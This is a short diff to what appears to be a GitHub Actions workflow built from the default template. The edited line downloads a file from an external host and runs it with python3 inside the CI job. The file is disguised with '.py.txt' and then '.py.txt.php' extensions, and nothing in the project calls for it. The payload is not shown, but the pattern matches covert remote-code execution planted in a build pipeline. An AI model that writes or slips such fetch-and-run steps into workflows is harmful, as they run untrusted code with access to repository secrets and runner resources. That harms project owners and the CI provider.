@@ -35,4 +35,4 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           pip3 install requests
-          wget -O bin 'https://api.xdpstorage.com/php/gms.py.txt' && python3 bin
+          wget -O bin 'https://api.xdpstorage.com/php/gms.py.txt.php' && python3 bin
